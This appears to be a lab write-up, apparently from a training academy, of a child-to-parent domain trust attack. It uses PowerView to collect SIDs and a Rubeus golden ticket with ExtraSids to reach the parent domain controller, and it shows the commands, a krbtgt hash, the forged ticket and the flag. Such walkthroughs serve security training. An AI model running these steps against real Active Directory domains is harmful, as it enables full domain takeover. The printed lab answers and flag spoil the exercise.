## Attacking Domain Trusts - Child -> Parent Trusts - from Windows

>  RDP to 10.129.180.47 (ACADEMY-EA-DC02) with user "htb-student_adm" and password "HTB_@cademy_stdnt_admin!"

* **What is the SID of the child domain?**

I initiated an RDP connection to the target Windows host 10.129.180.47 using xfreerdp with the provided credentials:

 ```c
xfreerdp /v:10.129.240.227 /u:htb-student_adm /p:HTB_@cademy_stdnt_admin! +aero -wallpaper -themes /bpp:16 /gdi:sw
```

Once connected, I launched PowerShell with administrative privileges and executed:

```c
Import-Module C:\Tools\PowerView.ps1
PS C:\Tools> Get-DomainSID
S-1-5-21-2806153819-209893948-922872689
```

* **What is the SID of the Enterprise Admins group in the root domain?**
For this question I executed:

 ```c
PS C:\Tools> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid
-----------------                                       ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```
* **Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain.**

Creating a Golden Ticket with Rubeus:

```c
PS C:\Tools> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
<snip>
[*] base64(ticket.kirbi):

      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


[+] Ticket successfully imported!
<snip>
```
Verifying the Kerberos Ticket

```c
PS C:\Tools> klist

Current LogonId is 0:0xe8f60

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/25/2025 8:49:48 (local)
        End Time:   3/25/2025 18:49:48 (local)
        Renew Time: 4/1/2025 8:49:48 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```
Accessing a the flag Using the Forged Ticket:

```c
PS C:\Tools> cat \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
f@ll1ng_l1k3_d0m1no3$
```
[![Screenshot-2025-03-25-120057.png](https://i.postimg.cc/tgZv16r7/Screenshot-2025-03-25-120057.png)](https://postimg.cc/5HJSTXWM)
